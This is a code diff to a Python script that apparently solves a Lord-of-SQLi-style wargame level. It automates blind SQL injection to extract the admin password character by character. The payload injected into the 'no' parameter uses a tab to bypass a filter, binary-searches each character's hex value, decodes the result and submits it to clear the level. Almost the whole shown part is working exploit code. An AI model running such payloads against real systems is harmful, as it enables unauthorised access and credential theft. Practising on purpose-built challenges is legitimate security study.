@@ -45,19 +45,22 @@ def main():
 
     print(len_of_key)
 
-    payload = '0||id\tin("admin")&&hex(mid(pw,%s,1))%s#'
-    param = dict(no=payload)
-    result = los.find_binary(url, param, check_func,
-                             0x14, 0x7F, len_of_key, cook)
+    result = ''
+    num_of_requests = 0
+    for i in range(1, len_of_key + 1):
+        payload = f'0||id\tin("admin")&&hex(mid(pw,{i},1))<%s#'
+        param = dict(no=payload)
+        left, num_requests = los.find_binary(url, param, check_func,
+                                             0x14, 0x7F, cook)
+        print(left)
+        # Convert to ascii
+        result += bytearray.fromhex(str(left)).decode()
+        num_of_requests += num_requests
 
+    print('num_of_requests:', num_of_requests)
     print(result)
-    # Convert to normal ascii
-    p = ''
-    for i in result:
-        p += bytearray.fromhex(str(ord(i))).decode()
-    print(p)
 
-    param = dict(pw=p)
+    param = dict(pw=result)
     response = los.get_request(url, param, cook)
 
     if 'Clear!' in response:
